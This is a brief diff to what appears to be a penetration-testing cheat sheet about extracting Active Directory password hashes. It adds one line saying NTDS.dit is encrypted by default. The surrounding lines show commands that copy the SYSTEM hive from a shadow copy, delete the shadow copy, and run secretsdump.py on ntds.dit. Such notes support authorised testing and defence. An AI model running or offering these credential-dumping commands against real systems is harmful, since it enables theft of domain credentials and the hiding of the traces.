@@ -80,6 +80,7 @@ It can be copied through Shadow copy
   copy <shadow>\Windows\system32\config\system ./system
   vssadmin delete shadow /for=C:
   secretsdump.py -ntds <ntds.dit> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
+NTDS.dit file is encrypted by default.
 
 
 
